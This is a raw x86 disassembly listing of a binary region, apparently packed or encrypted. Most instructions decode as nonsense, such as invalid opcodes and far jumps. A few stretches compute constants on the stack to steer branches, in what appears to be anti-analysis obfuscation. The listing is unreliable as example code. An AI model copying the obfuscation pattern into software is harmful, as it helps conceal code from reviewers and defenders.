  41b9a3:	jmp    0xc3e6effc
  41b9a8:	mov    ebp,0xb6126daf
  41b9ad:	addr16 pop ebx
  41b9af:	push   0x12
  41b9b1:	out    dx,al
  41b9b2:	test   BYTE PTR [edi+0x107bf6c9],ch
  41b9b8:	rcr    BYTE PTR [eax+0x18],1
  41b9bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9bc:	adc    eax,0xa8d4c8d7
  41b9c1:	mov    ah,0xa6
  41b9c3:	jae    0x41b9c6
  41b9c5:	push   0x2a
  41b9c7:	retf   0x9dd6
  41b9ca:	and    DWORD PTR [eax],edx
  41b9cc:	inc    edx
  41b9cd:	mov    edi,0x5a7184f5
  41b9d2:	mov    al,ds:0x791ab6d8
  41b9d7:	dec    edx
  41b9d8:	jne    0x41b975
  41b9da:	jmp    0xeef9:0xf45b49dc
  41b9e1:	psllw  mm4,QWORD PTR [edx]
  41b9e4:	xor    DWORD PTR [edx+0x66],0xffffffa4
  41b9e8:	sub    edi,ebp
  41b9ea:	add    BYTE PTR [edi],0x5e
  41b9ed:	aam    0x4c
  41b9ef:	(bad)  [eax+ecx*4+0x7d]
  41b9f3:	shl    BYTE PTR [eax],cl
  41b9f5:	jp     0x41b9b1
  41b9f7:	sbb    al,0xa3
  41b9f9:	sbb    al,0x8f
  41b9fb:	clc    
  41b9fc:	ds pop es
  41b9fe:	xchg   DWORD PTR [esi],esp
  41ba00:	xchg   BYTE PTR [edi+ecx*1],ah
  41ba03:	or     al,0xa0
  41ba05:	cmp    al,0xe
  41ba07:	add    edi,ecx
  41ba09:	int3   
  41ba0a:	mov    ch,0xf4
  41ba0c:	and    dl,BYTE PTR [eax-0x37e6c482]
  41ba12:	sub    dl,ch
  41ba14:	icebp  
  41ba15:	jmp    0x41ba91
  41ba17:	arpl   WORD PTR [eax-0x1759160f],ax
  41ba1d:	push   esp
  41ba1e:	je     0x41b9fd
  41ba20:	push   edi
  41ba21:	mov    dl,0xa2
  41ba23:	push   es
  41ba24:	out    dx,eax
  41ba25:	inc    esp
  41ba26:	jns    0x41ba1d
  41ba28:	add    DWORD PTR [eax+0xe],ebp
  41ba2b:	jbe    0x41b9cf
  41ba2d:	sbb    al,0x99
  41ba2f:	add    bl,BYTE PTR [eax+ebx*8]
  41ba32:	or     al,0x11
  41ba34:	cmp    bh,BYTE PTR [ebp+0x6d]
  41ba37:	fistp  DWORD PTR ds:0x15257515
  41ba3d:	int3   
  41ba3e:	mov    ds:0x17aefbbc,eax
  41ba43:	(bad)  [ecx]
  41ba45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba46:	mov    ah,0x39
  41ba48:	fiadd  WORD PTR [ebx]
  41ba4a:	loopne 0x41ba47
  41ba4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba4d:	sbb    ch,BYTE PTR [edi+0x6214a632]
  41ba53:	fld    TBYTE PTR [edx+0x5fa50a3f]
  41ba59:	adc    dh,BYTE PTR [edx-0x5e91fd45]
  41ba5f:	and    BYTE PTR [ebx+eax*8],0xc6
  41ba63:	leave  
  41ba64:	push   edx
  41ba65:	mov    bl,0xad
  41ba67:	mov    bh,0x88
  41ba69:	inc    ebp
  41ba6a:	pop    es
  41ba6b:	pop    ebp
  41ba6c:	ds mov dl,0x36
  41ba6f:	adc    BYTE PTR [ebp-0x1221759e],dh
  41ba75:	fwait
  41ba76:	(bad)  
  41ba77:	push   ebp
  41ba78:	inc    ebp
  41ba79:	into   
  41ba7a:	jle    0x41ba55
  41ba7c:	jae    0x41ba7d
  41ba7e:	cld    
  41ba7f:	stc    
  41ba80:	fwait
  41ba81:	jp     0x41babb
  41ba83:	jmp    0x41bab3
  41ba85:	and    BYTE PTR [esi+0x32],cl
  41ba88:	jae    0x41bb03
  41ba8a:	mov    bh,0xbc
  41ba8c:	xchg   ebx,eax
  41ba8d:	call   0xe419:0xe786f494
  41ba94:	mov    BYTE PTR [ebx],ah
  41ba96:	sub    esp,esi
  41ba98:	push   eax
  41ba99:	sbb    edx,DWORD PTR [esi-0x7e]
  41ba9c:	(bad)  
  41ba9d:	sbb    DWORD PTR [esi-0x43],esp
  41baa0:	idiv   dh
  41baa2:	dec    ebp
  41baa3:	jmp    DWORD PTR [ebp+esi*2+0x79]
  41baa7:	mov    ds:0xe40a3d36,eax
  41baac:	cs mov ebp,0xd47f9d9c
  41bab2:	cwde   
  41bab3:	lds    esp,FWORD PTR [edx+eiz*4-0xa]
  41bab7:	xchg   ebp,eax
  41bab8:	inc    edx
  41bab9:	or     DWORD PTR [ebx],0xd87534c8
  41babf:	or     BYTE PTR [ecx+0x2b7cc5e9],bh
  41bac5:	push   esp
  41bac6:	dec    eax
  41bac7:	jp     0x41bad6
  41bac9:	xchg   esp,eax
  41baca:	lea    ebx,[ebx-0x54845d45]
  41bad0:	test   DWORD PTR es:[eax-0x631578ca],0xe745d6ef
  41badb:	cmp    DWORD PTR [esi+edi*1],ecx
  41bade:	jo     0x41bb59
  41bae0:	add    BYTE PTR [ecx+0x78b521eb],ah
  41bae6:	and    eax,0x17b8ca15
  41baeb:	jb     0x41baeb
  41baed:	mov    eax,0xc8349a05
  41baf2:	push   edx
  41baf3:	add    eax,eax
  41baf5:	pop    ebp
  41baf6:	jb     0x41ba90
  41baf8:	or     cl,BYTE PTR [edx+eax*8+0x41b696fc]
  41baff:	stos   DWORD PTR es:[edi],eax
  41bb00:	xor    eax,ecx
  41bb02:	test   eax,0x1382924f
  41bb07:	xchg   esi,eax
  41bb08:	pop    ds
  41bb09:	test   BYTE PTR [eax+0x51],dh
  41bb0c:	pop    edi
  41bb0d:	loopne 0x41bb76
  41bb0f:	test   DWORD PTR [eax+0x36f44e6e],esp
  41bb15:	xchg   BYTE PTR [esi+eiz*2],ch
  41bb18:	outs   dx,BYTE PTR ds:[esi]
  41bb19:	(bad)  
  41bb1a:	mov    ch,0x2c
  41bb1c:	jmp    0x41bb35
  41bb1e:	and    DWORD PTR [edx+esi*1+0x7dcf1f74],0xdfbc00fd
  41bb29:	and    ecx,ebp
  41bb2b:	xor    DWORD PTR [esi+0x64],edi
  41bb2e:	fstp   DWORD PTR [ebp-0x7e]
  41bb31:	add    esp,DWORD PTR [eax+0xc54c349]
  41bb37:	pop    ebx
  41bb38:	pop    edx
  41bb39:	fbld   TBYTE PTR [ecx]
  41bb3b:	add    cl,BYTE PTR [edx+0x67]
  41bb3e:	xchg   ecx,eax
  41bb3f:	xchg   esi,eax
  41bb40:	pop    edx
  41bb41:	(bad)  
  41bb42:	xor    al,0x1b
  41bb44:	shl    DWORD PTR [edi-0x68],1
  41bb47:	fistp  QWORD PTR [edi]
  41bb49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb4a:	sbb    DWORD PTR [edi+0x7d],0x5a7b6aa4
  41bb51:	pop    ebx
  41bb52:	add    cl,BYTE PTR [ecx]
  41bb54:	ret    
  41bb55:	test   ebp,esp
  41bb57:	in     al,dx
  41bb58:	sub    dh,BYTE PTR [esi+0x55]
  41bb5b:	mov    ds:0xe34125,al
  41bb60:	lods   al,BYTE PTR ds:[esi]
  41bb61:	ja     0x41bb76
  41bb63:	xchg   edx,eax
  41bb64:	cmp    BYTE PTR [esi],al
  41bb66:	pop    edx
  41bb67:	mov    DWORD PTR cs:[edi+0x45],esi
  41bb6b:	call   0x7b53d463
  41bb70:	pushf  
  41bb71:	dec    esp
  41bb72:	push   eax
  41bb73:	sahf   
  41bb74:	retf   0xef35
  41bb77:	jg     0x41bbea
  41bb79:	pop    es
  41bb7a:	mov    ah,0x5e
  41bb7c:	xchg   ecx,eax
  41bb7d:	adc    DWORD PTR [esi-0x4f742999],esp
  41bb83:	fild   WORD PTR [edi+0x552731b]
  41bb89:	call   0x8392:0x15565a9c
  41bb90:	in     al,dx
  41bb91:	pop    edi
  41bb92:	mov    ch,0x2e
  41bb94:	mov    WORD PTR [ebx],fs
  41bb96:	ror    DWORD PTR [edx-0x174fcae2],0x25
  41bb9d:	xchg   ecx,eax
  41bb9e:	retf   0x605e
  41bba1:	dec    esp
  41bba2:	xchg   esi,eax
  41bba3:	(bad)  
  41bba4:	pop    ds
  41bba5:	leave  
  41bba6:	mov    edi,0xb063dc59
  41bbab:	retf   
  41bbac:	shr    ebx,cl
  41bbae:	popa   
  41bbaf:	xchg   esp,eax
  41bbb0:	mov    dl,0x69
  41bbb2:	jmp    0x41bb66
  41bbb4:	out    dx,al
  41bbb5:	shl    DWORD PTR [esi+0x594a4988],0x98
  41bbbc:	ret    0x20f4
  41bbbf:	jno    0x41bbc1
  41bbc1:	imul   edx,DWORD PTR [edi-0x10890b36],0x35e1324a
  41bbcb:	arpl   WORD PTR [ebx+edi*1],di
  41bbce:	cdq    
  41bbcf:	jl     0x41bc1a
  41bbd1:	inc    ecx
  41bbd2:	and    cx,dx
  41bbd5:	mov    dx,WORD PTR [esp+0x24]
  41bbda:	or     cx,dx
  41bbdd:	mov    dx,WORD PTR [esp+0x2c]
  41bbe2:	add    cx,dx
  41bbe5:	or     ecx,0x3b22
  41bbeb:	mov    WORD PTR [esp+0x3c],cx
  41bbf0:	jmp    0x41bfbf
  41bbf5:	inc    edx
  41bbf6:	pop    edx
  41bbf7:	push   ecx
  41bbf8:	fwait
  41bbf9:	xor    DWORD PTR [edx+0x237b5a22],ebx
  41bbff:	pop    ecx
  41bc00:	stos   BYTE PTR es:[edi],al
  41bc01:	push   ebp
  41bc02:	jno    0x41bbfa
  41bc04:	push   0x3
  41bc06:	adc    DWORD PTR [esi],0x1812bc18
  41bc0c:	sbb    bh,cl
  41bc0e:	jp     0x41bba3
  41bc10:	sub    BYTE PTR [edi+0x36],bh
  41bc13:	ins    DWORD PTR es:[edi],dx
  41bc14:	sar    DWORD PTR [ecx-0x2c],1
  41bc17:	cmp    BYTE PTR [edx-0x7f],0xaf
  41bc1b:	mov    bh,0x36
  41bc1d:	test   eax,0x4b910c90
  41bc22:	jp     0x41bba5
  41bc24:	(bad)  
  41bc25:	jecxz  0x41bc24
  41bc27:	inc    esp
  41bc28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc29:	inc    esp
  41bc2a:	cld    
  41bc2b:	push   ss
  41bc2c:	dec    ecx
  41bc2d:	ins    DWORD PTR es:[edi],dx
  41bc2e:	nop
  41bc2f:	jg     0x41bc89
  41bc31:	mov    dh,0x1e
  41bc33:	retf   
  41bc34:	fstp   QWORD PTR [edx-0x1f86d178]
  41bc3a:	mov    esi,0x1f2fa190
  41bc3f:	sub    al,0xac
  41bc41:	rcr    BYTE PTR [ebx-0x5a4be54d],1
  41bc47:	xchg   ecx,eax
  41bc48:	push   eax
  41bc49:	in     eax,0x9f
  41bc4b:	loopne 0x41bc0b
  41bc4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc4e:	mov    al,ds:0x809cd9fd
  41bc53:	xor    BYTE PTR [ebp-0x3a44acaa],ch
  41bc59:	and    BYTE PTR [ebp+0x71c76c7a],dl
  41bc5f:	add    eax,DWORD PTR [eax]
  41bc61:	dec    esp
  41bc62:	xchg   esp,eax
  41bc63:	mov    esi,0xcd80773c
  41bc68:	ror    DWORD PTR ds:0xc4e9d475,1
  41bc6e:	(bad)  
  41bc6f:	xchg   edx,eax
  41bc70:	jge    0x41bc05
  41bc72:	inc    edx
  41bc73:	inc    edx
  41bc74:	mov    cl,0x7d
  41bc76:	jne    0x41bc4d
  41bc78:	(bad)  
  41bc79:	inc    ebp
  41bc7a:	push   ebx
  41bc7b:	fsub   st,st(2)
  41bc7d:	pop    edi
  41bc7e:	inc    edx
  41bc7f:	aaa    
  41bc80:	lahf   
  41bc81:	inc    ebx
  41bc82:	jge    0x41bc71
  41bc84:	in     al,0xe2
  41bc86:	dec    edi
  41bc87:	sub    BYTE PTR [esi+eax*2],ah
  41bc8a:	pop    esi
  41bc8b:	loopne 0x41bc63
  41bc8d:	cmp    BYTE PTR [eax+esi*4-0x1e],dl
  41bc91:	out    0x6,eax
  41bc93:	sbb    al,0xc7
  41bc95:	lods   eax,DWORD PTR ds:[esi]
  41bc96:	iret   
  41bc97:	scas   al,BYTE PTR es:[edi]
  41bc98:	push   cs
  41bc99:	push   ss
  41bc9a:	mov    esi,0xbaa34158
  41bc9f:	pop    eax
  41bca0:	jae    0x41bc9d
  41bca2:	sahf   
  41bca3:	std    
  41bca4:	mov    DWORD PTR [eax+0x688b260c],edx
  41bcaa:	daa    
  41bcab:	into   
  41bcac:	test   DWORD PTR [ebp+0x45],esp
  41bcaf:	fnstenv cs:[ebp+0x65]
  41bcb3:	(bad)  
  41bcb4:	dec    ebx
  41bcb5:	jg     0x41bd12
  41bcb7:	cmp    bl,dh
  41bcb9:	pop    ebx
  41bcba:	loope  0x41bcb3
  41bcbc:	cwde   
  41bcbd:	adc    eax,0x609af633
  41bcc2:	jg     0x41bc69
  41bcc4:	pop    eax
  41bcc5:	xchg   ebx,eax
  41bcc6:	ret    
  41bcc7:	push   edi
  41bcc8:	pop    esi
  41bcc9:	adc    edx,DWORD PTR [edx+0x6]
  41bccc:	aas    
  41bccd:	jae    0x41bd27
  41bccf:	adc    eax,0x3acad47c
  41bcd4:	sar    DWORD PTR ds:0xa728838f,cl
  41bcda:	pop    ds
  41bcdb:	scas   al,BYTE PTR es:[edi]
  41bcdc:	test   DWORD PTR [edx+0x68],esi
  41bcdf:	mov    WORD PTR [esi-0x25],gs
  41bce2:	and    DWORD PTR [esi+0x16],esi
  41bce5:	mov    WORD PTR [ebx],gs
  41bce7:	or     al,BYTE PTR [esi+edi*8+0x1b]
  41bceb:	xor    eax,0xe5e231f6
  41bcf0:	cmp    eax,0xbcdc423f
  41bcf5:	sub    BYTE PTR [ebp-0x715d87be],0x3a
  41bcfc:	fmul   QWORD PTR [ebp-0x1b]
  41bcff:	not    BYTE PTR [edx-0x36]
  41bd02:	and    DWORD PTR [ecx],edx
  41bd04:	or     al,0x4c
  41bd06:	xor    DWORD PTR [ecx-0x32],ecx
  41bd09:	fs mov ebx,0x3817772e
  41bd0f:	pop    ecx
  41bd10:	lods   eax,DWORD PTR ds:[esi]
  41bd11:	call   DWORD PTR [edx]
  41bd13:	push   ds
  41bd14:	pop    esi
  41bd15:	sti    
  41bd16:	mov    ecx,ebx
  41bd18:	(bad)  [ebp+edx*8+0x792f6d09]
  41bd1f:	out    0x74,eax
  41bd21:	mov    ebx,0x6436672a
  41bd26:	lea    edi,[edi]
  41bd28:	sbb    BYTE PTR [ebp+eax*4-0x76],dl
  41bd2c:	adc    ebp,DWORD PTR [edx]
  41bd2e:	or     edi,DWORD PTR [eax-0x70]
  41bd31:	(bad)  
  41bd32:	jo     0x41bd05
  41bd34:	xchg   ebp,eax
  41bd35:	and    BYTE PTR [ecx+0x603fb1e2],cl
  41bd3b:	dec    ebx
  41bd3c:	in     al,dx
  41bd3d:	sub    ecx,DWORD PTR ds:0xe3672104
  41bd43:	fwait
  41bd44:	in     eax,0x8b
  41bd46:	dec    ebx
  41bd47:	shl    BYTE PTR [edi+0x19],0x9f
  41bd4b:	mov    ah,0xc1
  41bd4d:	mov    eax,0xb34a721c
  41bd52:	mov    al,0x48
  41bd54:	shl    DWORD PTR [ebp-0x74c6ae9a],0x70
  41bd5b:	jne    0x41bdbe
  41bd5d:	pop    ebp
  41bd5e:	std    
  41bd5f:	push   ds
  41bd60:	sar    BYTE PTR [esi+0x48],1
  41bd63:	ror    BYTE PTR [eax],1
  41bd65:	rol    DWORD PTR [esi-0x18cb56f2],0xf5
  41bd6c:	cmp    BYTE PTR [ebx],cl
  41bd6e:	xchg   edx,eax
  41bd6f:	test   al,0x4a
  41bd71:	push   ebp
  41bd72:	mov    eax,ds:0xed9f23ef
  41bd77:	seto   BYTE PTR [ecx-0x53]
  41bd7b:	mov    ecx,0x60b3ec8f
  41bd80:	mov    ds:0xe9b7b7c9,al
  41bd85:	mov    ah,0xef
  41bd87:	mov    WORD PTR [esi],ss
  41bd89:	test   eax,0x7327b24
  41bd8e:	test   ch,bh
  41bd90:	popa   
  41bd91:	cmp    bl,dl
  41bd93:	les    edx,FWORD PTR [ebp-0x604120ee]
  41bd99:	in     al,dx
  41bd9a:	(bad)  
  41bd9b:	in     eax,dx
  41bd9c:	retf   
  41bd9d:	arpl   WORD PTR [ebx+ebp*2-0x393cf89b],sp
  41bda4:	(bad)  [esi-0x43]
  41bda7:	mov    bl,0xfe
  41bda9:	rcr    BYTE PTR [edx],0x44
  41bdac:	loop   0x41bdbf
  41bdae:	cmp    dl,ch
  41bdb0:	and    eax,0x37f2b48d
  41bdb5:	adc    ecx,DWORD PTR [edi]
  41bdb7:	pop    ss
  41bdb8:	cmp    ebx,DWORD PTR [ebx+0x3a]
  41bdbb:	push   ebx
  41bdbc:	fmul   QWORD PTR [eax]
  41bdbe:	xor    DWORD PTR [edx],esi
  41bdc0:	xlat   BYTE PTR ds:[ebx]
  41bdc1:	dec    edi
  41bdc2:	push   ss
  41bdc3:	lods   al,BYTE PTR ds:[esi]
  41bdc5:	stos   BYTE PTR es:[edi],al
  41bdc6:	xor    bh,BYTE PTR [edx-0x21f4aa1]
  41bdcc:	dec    BYTE PTR [eax]
  41bdce:	shr    DWORD PTR [ebp+0x727d6093],1
  41bdd4:	sbb    al,0x5c
  41bdd6:	iret   
  41bdd7:	cmp    DWORD PTR [ebx-0x1b],ebp
  41bdda:	loope  0x41bd7c
  41bddc:	out    0x7b,al
  41bdde:	cmp    ebp,DWORD PTR [eax]
  41bde0:	test   ah,al
  41bde2:	mov    dh,0x67
  41bde4:	push   0x7b
  41bde6:	mov    WORD PTR [ecx],gs
  41bde8:	repnz cmp eax,0xdf8a84f1
  41bdee:	adc    cl,cl
  41bdf0:	xchg   DWORD PTR [ebx+ebx*4-0x238c17b6],ecx
  41bdf7:	stos   BYTE PTR es:[edi],al
  41bdf8:	inc    edx
  41bdf9:	pushf  
  41bdfa:	(bad)  
  41bdfb:	fcom   st(3)
  41bdfd:	mov    cl,0x8e
  41bdff:	pop    es
  41be00:	and    ecx,esp
  41be02:	push   ecx
  41be03:	cmp    dl,BYTE PTR [edx+0x21203913]
  41be09:	js     0x41be1a
  41be0b:	aad    0xc2
  41be0d:	fcmovb st,st(3)
  41be0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be10:	mov    dl,0x9f
  41be12:	xor    al,BYTE PTR [esi]
  41be14:	xchg   BYTE PTR [eax-0x35],bh
  41be17:	push   esp
  41be18:	loopne 0x41be06
  41be1a:	rcr    BYTE PTR [edx],1
  41be1c:	sub    al,0x58
  41be1e:	test   eax,0x399ab90
  41be23:	(bad)  
  41be24:	(bad)  
  41be25:	das    
  41be26:	fsubr  st(2),st
  41be28:	sbb    al,0x4c
  41be2a:	mov    ecx,DWORD PTR ds:0xfda24378
  41be30:	inc    esp
  41be31:	pop    ss
  41be32:	ja     0x41be36
  41be34:	fbstp  TBYTE PTR [edx+0x36]
  41be37:	es ja  0x41be27
  41be3a:	repnz mov WORD PTR [ecx+eax*1],ds
  41be3e:	data16 jp 0x41be07
  41be41:	lods   eax,DWORD PTR ds:[esi]
  41be42:	mov    BYTE PTR [edi+0x42d263b5],ch
  41be48:	out    dx,eax
  41be49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be4a:	fsub   DWORD PTR [ebp+0x20b24790]
  41be50:	jno    0x41be1a
  41be52:	stc    
  41be53:	push   esi
  41be54:	sbb    eax,0xe447d643
  41be59:	mov    bh,0xd3
  41be5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be5c:	leave  
  41be5d:	clc    
  41be5e:	pop    eax
  41be5f:	sti    
  41be60:	repnz ds out dx,eax
  41be63:	jge    0x41be52
  41be65:	outs   dx,BYTE PTR ds:[esi]
  41be66:	test   DWORD PTR [esi+0x648e52f9],esp
  41be6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be6d:	(bad)  [eax+eax*4+0x69]
  41be71:	sbb    BYTE PTR [eax-0xc4d4d5],bl
  41be77:	nop
  41be78:	mov    ds:0x1f5e668b,al
  41be7d:	mov    eax,DWORD PTR [esp+eiz*4+0x26]
  41be81:	dec    edx
  41be82:	sub    eax,ebx
  41be84:	(bad)  
  41be86:	push   ds
  41be87:	movzx  ecx,BYTE PTR ds:0xa9f33163
  41be8e:	mov    edx,0xbf44523
  41be93:	in     eax,dx
  41be94:	cli    
  41be95:	jne    0x41be6d
  41be97:	and    al,0x85
  41be99:	sbb    eax,edx
  41be9b:	xor    esp,DWORD PTR [ebx+eiz*1-0x48]
  41be9f:	mov    ch,BYTE PTR [edi-0x30]
  41bea2:	add    al,0x9
  41bea4:	shl    dh,0x24
  41bea7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bea8:	mov    ecx,0xb8ef100a
  41bead:	(bad)  
  41beb0:	mov    WORD PTR [edi+0x7fa27a],fs
  41beb6:	dec    esp
  41beb7:	add    ecx,DWORD PTR [ebx-0x1e]
  41beba:	mov    eax,ds:0x2f868876
  41bebf:	xor    eax,DWORD PTR [eax+0x36bbc48d]
  41bec5:	inc    ecx
  41bec6:	das    
  41bec7:	aaa    
  41bec8:	pop    ecx
  41bec9:	in     al,0x7c
  41becb:	cmp    ch,bl
  41becd:	ins    BYTE PTR es:[edi],dx
  41bece:	outs   dx,BYTE PTR ds:[esi]
  41becf:	(bad)  
  41bed0:	xchg   ebx,eax
  41bed1:	mov    ds,ebx
  41bed3:	pop    ss
  41bed4:	fsub   DWORD PTR [ecx+ecx*4+0x45]
  41bed8:	and    DWORD PTR [esp+esi*4],0x1535830
  41bedf:	das    
  41bee0:	push   edx
  41bee1:	sbb    bl,BYTE PTR [edx-0x23]
  41bee4:	scas   al,BYTE PTR es:[edi]
  41bee5:	shr    BYTE PTR [eax],0xba
  41bee8:	test   DWORD PTR [edx-0x433aabac],0x5548e4d8
  41bef2:	jne    0x41be8a
  41bef4:	mov    edx,0x7853bd9a
  41bef9:	lds    edi,FWORD PTR [ecx]
  41befb:	pop    esp
  41befc:	pop    eax
  41befd:	dec    esp
  41befe:	imul   eax,DWORD PTR [edi+0x44eca35f],0xffffff92
  41bf05:	dec    esp
  41bf06:	pop    eax
  41bf07:	mov    eax,ds:0x28a46216
  41bf0c:	add    BYTE PTR [ebp-0x2ed6c577],al
  41bf12:	sbb    DWORD PTR [esi+0xa480c3c],eax
  41bf18:	cmc    
  41bf19:	xor    al,0x42
  41bf1b:	jl     0x41bea3
  41bf1d:	or     esi,DWORD PTR [eax-0x65bebae4]
  41bf23:	fdivp  st(5),st
  41bf25:	in     al,0xdd
  41bf27:	aaa    
  41bf28:	mov    edi,0xb700f55c
  41bf2d:	add    al,0x77
  41bf2f:	call   0x6f41a0b2
  41bf34:	pop    DWORD PTR ss:[eax-0x14fdb74c]
  41bf3b:	and    ch,BYTE PTR [ebp+0x4]
  41bf3e:	dec    ax
  41bf40:	push   eax
  41bf41:	fst    DWORD PTR [eax+0x2c]
  41bf44:	loopne 0x41bec6
  41bf46:	add    edi,ebx
  41bf48:	sub    al,0xb3
  41bf4a:	cs mov dh,0x43
  41bf4d:	not    BYTE PTR [ebx-0x64]
  41bf50:	pop    esp
  41bf51:	sbb    DWORD PTR [edi-0x4e],edx
  41bf54:	adc    eax,0xf2d5013f
  41bf59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf5a:	int    0x86
  41bf5c:	cmp    al,0xbd
  41bf5e:	mov    ds:0x35203af1,eax
  41bf63:	loope  0x41beea
  41bf65:	daa    
  41bf66:	pop    esp
  41bf67:	xchg   edi,eax
  41bf68:	mov    edi,?
  41bf6a:	sub    edi,0x29
  41bf6d:	sar    BYTE PTR [ecx],1
  41bf6f:	or     ebp,DWORD PTR [edi+0x55fa65f9]
  41bf75:	fcomp  st(6)
  41bf77:	add    al,0xe8
  41bf79:	dec    ebp
  41bf7a:	push   eax
  41bf7b:	xor    DWORD PTR [edi-0x148b5351],edi
  41bf81:	mov    esi,0xfbfcbeb2
  41bf86:	in     al,dx
  41bf87:	in     eax,0x49
  41bf89:	js     0x41bfc5
  41bf8b:	(bad)  
  41bf8c:	dec    edi
  41bf8d:	xchg   ecx,eax
  41bf8e:	in     eax,0x7d
  41bf90:	shl    cl,0x19
  41bf93:	into   
  41bf94:	ja     0x41bfcc
  41bf96:	pop    edi
  41bf97:	lods   eax,DWORD PTR ds:[esi]
  41bf98:	popf   
  41bf99:	xor    DWORD PTR ds:0x404f59cb,esi
  41bf9f:	fwait
  41bfa0:	sub    al,0x82
  41bfa2:	dec    edx
  41bfa3:	xchg   BYTE PTR cs:[edi+0x51],ch
  41bfa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfa8:	mov    es,esp
  41bfaa:	cmp    eax,0x68f0a3a8
  41bfaf:	xor    al,0x5d
  41bfb1:	add    dl,BYTE PTR [edx+edi*1-0x8]
  41bfb5:	xor    eax,0x2a067395
  41bfba:	dec    ebx
  41bfbb:	call   0xba385e3b
  41bfc0:	aam    0x57
  41bfc2:	add    BYTE PTR [eax],al
  41bfc4:	mov    WORD PTR [esp+0x2c],cx
  41bfc9:	mov    ecx,0x3b21
  41bfce:	mov    WORD PTR [esp+0x38],cx
  41bfd3:	mov    ecx,0x52fd
  41bfd8:	mov    WORD PTR [esp+0x24],cx
  41bfdd:	mov    ecx,0x2ce0
  41bfe2:	mov    WORD PTR [esp+0xc],cx
  41bfe7:	mov    cx,WORD PTR [esp+0xc]
  41bfec:	mov    dx,WORD PTR [esp+0x24]
  41bff1:	or     cx,dx
  41bff4:	mov    edx,0x21a4
  41bff9:	or     cx,dx
  41bffc:	mov    dx,WORD PTR [esp+0x2c]
  41c001:	sub    cx,dx
  41c004:	mov    dx,WORD PTR [esp+0x38]
  41c009:	sub    cx,dx
  41c00c:	mov    dx,WORD PTR [esp+0x3c]
  41c011:	cmp    dx,cx
  41c014:	jbe    0x41c888
  41c01a:	mov    ecx,0x5008
  41c01f:	mov    WORD PTR [esp+0x24],cx
  41c024:	mov    ecx,0x60ce
  41c029:	mov    WORD PTR [esp+0xc],cx
  41c02e:	movzx  ecx,WORD PTR [esp+0xc]
  41c033:	mov    edx,0x2095
  41c038:	or     cx,dx
  41c03b:	mov    dx,WORD PTR [esp+0x24]
  41c040:	sub    cx,dx
  41c043:	mov    edx,0x10de
  41c048:	or     ecx,0x742f
  41c04e:	imul   ecx,ecx,0x30b2
  41c054:	mov    WORD PTR [esp+0x3c],cx
  41c059:	mov    ecx,0x6143
  41c05e:	mov    WORD PTR [esp+0x38],cx
  41c063:	mov    ecx,0x679f
  41c068:	mov    WORD PTR [esp+0x2c],cx
  41c06d:	mov    ecx,0x1210
  41c072:	mov    WORD PTR [esp+0x24],cx
  41c077:	mov    ecx,0x3308
  41c07c:	mov    WORD PTR [esp+0xc],cx
  41c081:	mov    cx,WORD PTR [esp+0xc]
  41c086:	sub    cx,dx
  41c089:	mov    dx,WORD PTR [esp+0x24]
  41c08e:	xor    cx,dx
  41c091:	mov    dx,WORD PTR [esp+0x2c]
  41c096:	imul   cx,dx
  41c09a:	mov    dx,WORD PTR [esp+0x38]
  41c09f:	and    cx,dx
  41c0a2:	mov    edx,0x694c
  41c0a7:	and    cx,dx
  41c0aa:	mov    dx,WORD PTR [esp+0x3c]
  41c0af:	cmp    dx,cx
  41c0b2:	ja     0x41c888
  41c0b8:	mov    ecx,DWORD PTR [esp+0x18]
  41c0bc:	mov    edx,DWORD PTR [esp+0x1c]
  41c0c0:	shrd   ecx,edx,0x2
  41c0c4:	xor    ecx,eax
  41c0c6:	mov    eax,DWORD PTR [esp+0x18]
  41c0ca:	shr    edx,0x2
  41c0cd:	mov    edx,DWORD PTR [esp+0x1c]
  41c0d1:	xor    edx,edx
  41c0d3:	or     edx,ecx
  41c0d5:	push   edx
  41c0d6:	push   esi
  41c0d7:	shl    eax,0x1e
  41c0da:	push   edi
  41c0db:	lea    eax,[esp+0x7c]
  41c0df:	push   eax
  41c0e0:	lea    eax,[esp+0x28]
  41c0e4:	push   eax
  41c0e5:	jmp    0x41c4b4
  41c0ea:	in     eax,0x66
  41c0ec:	sar    BYTE PTR [ebx],1
  41c0ee:	dec    edx
  41c0ef:	sbb    esp,DWORD PTR [edx+0x1e]
  41c0f2:	icebp  
  41c0f3:	scas   eax,DWORD PTR es:[edi]
  41c0f4:	mov    ch,0x7c
  41c0f6:	pop    ebp
  41c0f7:	mov    ?,WORD PTR [ebp-0x50]
  41c0fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0fb:	jns    0x41c113
  41c0fd:	sbb    BYTE PTR [edx+edx*1+0x3701818],bh
  41c104:	lahf   
  41c105:	das    
  41c106:	sbb    eax,0x4a3b28de
  41c10b:	inc    ebx
  41c10c:	push   cs
  41c10d:	pusha  
  41c10e:	jmp    0x5b9f:0xbb1e5c0b
  41c115:	sub    eax,0x74deab11
  41c11a:	stos   DWORD PTR es:[edi],eax
  41c11b:	or     bl,BYTE PTR [ebp+ebx*2+0x56]
  41c11f:	ins    DWORD PTR es:[edi],dx
  41c120:	add    bl,BYTE PTR ds:0x47e9b46e
  41c126:	jo     0x41c0d8
  41c128:	add    DWORD PTR [ebp+0x12],ecx
  41c12b:	pop    edx
  41c12c:	scas   eax,DWORD PTR es:[edi]
  41c12d:	mov    dh,0xeb
  41c12f:	jb     0x41c0e5
  41c131:	or     eax,0xd21a3f16
  41c137:	inc    ecx
  41c138:	xor    DWORD PTR [bp+0x590a],edi
  41c13d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c13e:	js     0x41c0c2
  41c140:	cmp    al,0x83
  41c142:	push   ss
